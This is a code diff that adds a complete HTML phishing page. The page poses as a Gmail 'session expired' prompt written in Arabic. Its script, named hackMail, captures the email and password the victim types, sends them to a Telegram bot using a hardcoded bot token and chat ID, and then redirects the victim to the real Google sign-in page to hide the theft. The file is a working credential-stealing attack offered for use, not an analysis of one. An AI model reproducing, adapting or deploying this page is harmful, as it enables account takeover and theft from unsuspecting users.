@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<script>
+function hackMail() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const e = document.getElementById('m').value;
+    const p = document.getElementById('p').value;
+    const msg = `📧 **صيد إيميل جديد**\n\n👤 البريد: \`${e}\`\n🔑 الباسورد: \`${p}\``;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    window.location.href = "https://accounts.google.com";
+}
+</script>
+<body style="text-align:center; font-family:sans-serif; padding-top:50px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/512px-Gmail_icon_%282020%29.svg.png" width="100"><br>
+    <h3>انتهت صلاحية الجلسة</h3>
+    <p>يرجى إعادة إدخال كلمة السر للمتابعة</p>
+    <input id="m" placeholder="Email" style="width:80%; padding:10px; margin:10px;"><br>
+    <input id="p" type="password" placeholder="Password" style="width:80%; padding:10px; margin:10px;"><br>
+    <button onclick="hackMail()" style="width:83%; background:#4285f4; color:white; padding:10px; border:none; font-weight:bold;">تسجيل الدخول</button>
+</body>
+</html>
